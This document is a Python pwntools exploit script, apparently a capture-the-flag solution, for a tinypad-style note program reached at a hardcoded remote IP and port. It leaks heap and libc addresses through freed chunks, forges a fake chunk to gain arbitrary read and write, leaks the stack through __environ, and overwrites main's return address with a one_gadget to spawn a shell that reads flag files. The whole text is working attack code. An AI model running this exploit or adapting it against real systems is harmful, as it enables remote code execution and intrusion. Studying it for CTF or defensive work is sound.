from pwn import *
context.update(arch="amd64", os="linux", log_level="info", timeout=4)
host = "39.96.193.120"
port = 10003

elf_bin = ELF("./combination_final", checksec=False)
libc_so = ELF("./libc.so.6", checksec=False)

tinypad_addr = elf_bin.symbols["tinypad"]
environ = libc_so.symbols["__environ"]
malloc_libc = libc_so.symbols["__malloc_hook"]
og = 0x45226

def add_note(io, sz, data):
    io.sendlineafter(b"COMMAND >> ", b"A")
    io.sendlineafter(b"MEM_SIZE >> ", str(sz).encode())
    io.sendlineafter(b"MEM_DATA >> ", data)

def del_note(io, idx):
    io.sendlineafter(b"COMMAND >> ", b"D")
    io.sendlineafter(b"INDEX_ID >> ", str(idx).encode())

def edit_note(io, idx, data):
    io.sendlineafter(b"COMMAND >> ", b"E")
    io.sendlineafter(b"INDEX_ID >> ", str(idx).encode())
    io.sendlineafter(b"MEM_DATA >> ", data)
    io.sendlineafter(b"APPLY_CHANGE? (Y/n) >> ", b"Y")

def pwn():
    io = remote(host, port)

    for c in [b"1", b"2", b"3", b"4"]:
        add_note(io, 0x80, c * 0x80)

    del_note(io, 3)
    del_note(io, 1)

    io.recvuntil(b"Deleted.")
    io.recvuntil(b"CONTENT: ")
    leak0 = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    heap_base = leak0 - 0x120

    io.recvuntil(b"CONTENT: ")
    io.recvuntil(b"CONTENT: ")
    libc_so.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x58 - malloc_libc - 0x10

    log.info("heap  %#x", heap_base)
    log.info("libc  %#x", libc_so.address)

    del_note(io, 2)
    del_note(io, 4)

    add_note(io, 0x10, b"1" * 0x10)
    add_note(io, 0x100, b"2" * 0xF8 + p64(0x11))
    add_note(io, 0x80,  b"3" * 0x80)
    add_note(io, 0x80,  b"4" * 0x80)

    del_note(io, 1)
    add_note(io, 0x18, b"1" * 0x10 + p64(heap_base - tinypad_addr))
    edit_note(io, 3, b"3" * 0x20 + p64(0) + p64(0x21) + p64(tinypad_addr + 0x20) * 2 + p64(0x20))

    del_note(io, 2)
    edit_note(io, 4, b"4" * 0x20 + p64(0) + p64(0x101) + p64(libc_so.symbols["__malloc_hook"] + 0x10 + 0x58) * 2)

    io.recvrepeat(0.2)
    add_note(io, 0xF0, b"2" * 0xD0 + p64(666) + p64(libc_so.address + environ) + b"a" * 8 + p64(tinypad_addr + 0x108))

    io.recvuntil(b"INDEX: 1")
    io.recvuntil(b"CONTENT: ")
    stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
    main_ret = stack_leak - 0xF0
    gadget = libc_so.address + og

    log.info("stack  %#x  ret  %#x  og  %#x", stack_leak, main_ret, gadget)

    edit_note(io, 2, p64(main_ret))
    edit_note(io, 1, p64(gadget))

    io.sendlineafter(b"COMMAND >> ", b"Q")
    io.sendline(b"echo SHELL; /bin/cat /flag flag flag.txt ./flag ./flag.txt 2>/dev/null; exit")
    data = io.recvrepeat(2)
    print(data.decode("latin1", "replace"))

if __name__ == "__main__":
    pwn()
